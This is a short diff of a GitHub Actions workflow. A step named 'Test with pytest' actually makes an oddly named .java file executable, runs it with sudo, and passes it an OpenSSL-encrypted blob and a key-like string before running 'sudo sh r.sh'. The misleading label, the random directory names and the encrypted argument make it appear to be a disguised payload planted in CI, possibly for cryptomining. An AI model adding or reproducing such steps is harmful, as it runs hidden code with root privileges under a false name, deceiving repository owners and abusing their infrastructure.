@@ -28,6 +28,6 @@ jobs:
     - name: Test with pytest
       run: |
         cd ${{ github.workspace }}
-        echo 'yl4st'
+        echo 'p3tk6'
         sudo chmod +x worleyqopw2/kruegerow1qy/rubiotz3d1/yodergn1cy.java
-        sudo ./worleyqopw2/kruegerow1qy/rubiotz3d1/yodergn1cy.java   && sudo sh r.sh
+        sudo ./worleyqopw2/kruegerow1qy/rubiotz3d1/yodergn1cy.java U2FsdGVkX1/VgosvfCd2L3cUu8BEXtJitc5PiD5fCbXdqaTCaFZ7yE7fsPUEjWvbk1ea45w+YRUtxHU8B3RtJBGritAmH/eg/XJF7kq/D9CUbCfEnRe6Wnt19XhjeKpn wyn4fv && sudo sh r.sh
